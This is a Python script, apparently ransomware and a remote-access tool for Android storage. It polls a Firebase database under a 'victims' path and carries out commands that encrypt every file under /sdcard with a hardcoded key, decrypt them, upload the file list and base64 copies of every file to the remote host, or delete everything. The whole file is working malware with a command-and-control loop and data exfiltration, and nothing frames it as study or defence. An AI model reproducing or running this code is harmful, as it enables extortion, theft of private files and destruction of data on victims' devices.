import os, time, base64, json, requests
from Crypto.Cipher import AES
from hashlib import sha256

database_url = "https://vibe-chat-b1e67-default-rtdb.firebaseio.com"
vitima_id = "KIRA-PC"
senha = "hackerkira12345"
pasta_alvo = "/sdcard"
url_base = f"{database_url}/vítimas/{vitima_id}"

def gerar_chave(senha):
    return sha256(senha.encode()).digest()

def preencher(bloco):
    while len(bloco) % 16 != 0:
        bloco += b' '
    return bloco

def criptografar():
    chave = gerar_chave(senha)
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            path = os.path.join(dirpath, file)
            try:
                with open(path, "rb") as f:
                    dados = f.read()
                cipher = AES.new(chave, AES.MODE_ECB)
                cifrado = cipher.encrypt(preencher(dados))
                with open(path, "wb") as f:
                    f.write(cifrado)
            except:
                pass

def descriptografar():
    chave = gerar_chave(senha)
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            path = os.path.join(dirpath, file)
            try:
                with open(path, "rb") as f:
                    dados = f.read()
                cipher = AES.new(chave, AES.MODE_ECB)
                decifrado = cipher.decrypt(dados).rstrip(b' ')
                with open(path, "wb") as f:
                    f.write(decifrado)
            except:
                pass

def listar_arquivos():
    arquivos = []
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            arquivos.append(os.path.join(dirpath, file))
    requests.put(f"{url_base}/arquivos.json", data=json.dumps(arquivos))

def copiar_arquivos():
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            path = os.path.join(dirpath, file)
            try:
                with open(path, "rb") as f:
                    conteudo = base64.b64encode(f.read()).decode()
                nome_seguro = file.replace(".", "_")
                requests.put(f"{url_base}/copias/{nome_seguro}.json", data=json.dumps(conteudo))
            except:
                pass

def deletar_arquivos():
    for dirpath, _, files in os.walk(pasta_alvo):
        for file in files:
            try:
                os.remove(os.path.join(dirpath, file))
            except:
                pass

def escutar():
    requests.put(f"{url_base}/status.json", data=json.dumps(True))
    while True:
        resp = requests.get(f"{url_base}/comando.json")
        if resp.status_code == 200:
            comando = resp.json()
            if comando == "criptografar":
                criptografar()
            elif comando == "descriptografar":
                descriptografar()
            elif comando == "listar_arquivos":
                listar_arquivos()
            elif comando == "copiar_arquivos":
                copiar_arquivos()
            elif comando == "deletar_arquivos":
                deletar_arquivos()
            requests.put(f"{url_base}/comando.json", data=json.dumps(None))
        time.sleep(3)

if __name__ == "__main__":
    escutar()